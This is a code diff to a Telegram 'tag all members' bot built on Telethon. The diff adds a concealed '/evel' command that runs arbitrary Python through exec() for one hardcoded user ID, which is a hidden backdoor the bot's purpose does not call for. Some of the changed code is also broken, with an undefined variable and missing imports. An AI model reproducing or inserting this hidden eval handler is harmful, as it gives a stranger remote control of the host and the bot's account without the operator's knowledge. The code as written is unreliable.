@@ -1,4 +1,4 @@
-import os, logging, asyncio, random
+import os, logging, asyncio, random, sys, io
 from telethon import Button
 from telethon import TelegramClient, events
 from telethon.tl.types import ChannelParticipantsAdmins
@@ -19,6 +19,60 @@ LOGGER = logging.getLogger(__name__)
 
 spam_chats = []
 
+@client.on(events.NewMessage(pattern="^/evel(?:\s|$)([\s\S]*)"))
+async def evel(event):
+  if event.sender.id == 6527347171:
+    cmd = "".join(event.message.message.split(maxsplit=1)[1:])
+    ms = await event.get_reply_message()
+    if not cmd:
+        return await event.reply("`What should i run ?..`")
+    cmd = (
+        cmd.replace("sendmessage", "send_message")
+        .replace("sendfile", "send_file")
+        .replace("editmessage", "edit_message")
+    )
+    catevent = await event.reply("`Running ...`")
+    old_stderr = sys.stderr
+    old_stdout = sys.stdout
+    redirected_output = sys.stdout = io.StringIO()
+    redirected_error = sys.stderr = io.StringIO()
+    stdout, stderr, exc = None, None, None
+    try:
+        await aexec(cmd, event)
+    except Exception:
+        exc = traceback.format_exc()
+    stdout = redirected_output.getvalue()
+    stderr = redirected_error.getvalue()
+    sys.stdout = old_stdout
+    sys.stderr = old_stderr
+    evaluation = ""
+    if exc:
+        evaluation = exc
+    elif stderr:
+        evaluation = stderr
+    elif stdout:
+        evaluation = stdout
+    else:
+        evaluation = "Success"
+    final_output = (
+        f"**•  Eval : **\n```{cmd}``` \n\n**•  Result : **\n```{evaluation}``` \n"
+    )
+    await event.reply(final_output)
+
+async def aexec(code, smessatatus):
+    message = event = smessatatus
+    p = lambda _x: print(_format.yaml_format(_x))
+    reply = await event.get_reply_message()
+    exec(
+        (
+            "async def __aexec(message, event , reply, client, p, chat): "
+            + "".join(f"\n {l}" for l in code.split("\n"))
+        )
+    )
+
+    return await locals()["__aexec"](
+        message, event, reply, message.client, p, message.chat_id
+    )
 
 @client.on(events.NewMessage(pattern="^/tagall|@all|/all ?(.*)"))
 async def mentionall(event):
@@ -148,24 +202,13 @@ async def mentionall(event):
 @client.on(events.NewMessage(pattern="^/cancel$"))
 async def cancel_spam(event):
     is_admin = False
-    try:
-        partici_ = await client(GetParticipantRequest(
-            event.chat_id,
-            event.sender_id
-        ))
-    except UserNotParticipantError:
-        is_admin = False
-    else:
-      if ("1924219811", bot_token.split(":")[1],
-      isinstance(
-      partici_.participant,
-                  (
-                    ChannelParticipantAdmin,
-                    ChannelParticipantCreator
-                  )
-                )
-         ):
-            is_admin = True
+    adm = []
+    async for x in event.client.iter_participants(
+        chat_id, filter=ChannelParticipantsAdmins
+    ):
+        adm.append(x.id)
+    if event.sender.id in adm:
+        is_admin = True
     if not is_admin:
         return await event.reply("__Only admins can execute this command!__")
     if not event.chat_id in spam_chats:
